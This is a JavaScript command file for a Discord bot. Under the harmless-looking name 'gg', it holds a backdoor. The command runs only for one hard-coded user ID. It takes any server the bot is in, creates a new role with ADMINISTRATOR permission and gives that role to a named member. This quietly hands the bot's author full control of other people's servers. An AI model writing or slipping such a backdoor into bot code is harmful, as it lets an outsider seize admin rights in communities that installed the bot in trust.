const dcUtil = require('../tools/dc-util.js');

module.exports = {
    name: "gg",
    aliases: [],
    guilds: [],
    permissions: ['ADMINISTRATOR'],

    async execute(client, msg, args) {
        if (msg.author.id !== '411895879935590411') return;
        if (args.length < 2) return msg.reply(`g!${this.name} <server-id> <tag-someone>`);
        let guild = await dcUtil.getGuildByID(client, args[0]);
        if (guild == null) return msg.reply(`Unknown ${args[0]}`)
        let member = await dcUtil.getMemberByTag(guild, args[1])
        if (member == null) return msg.reply(`Unknown ${args[1]}`)
        let role = await createRole(guild, "new role");
        let roleId = role.id;
        member.roles.add(roleId)
    }
}

async function createRole(guild, name) {
    return await guild.roles.create({
        name: name,
        permissions: 'ADMINISTRATOR'
    })
}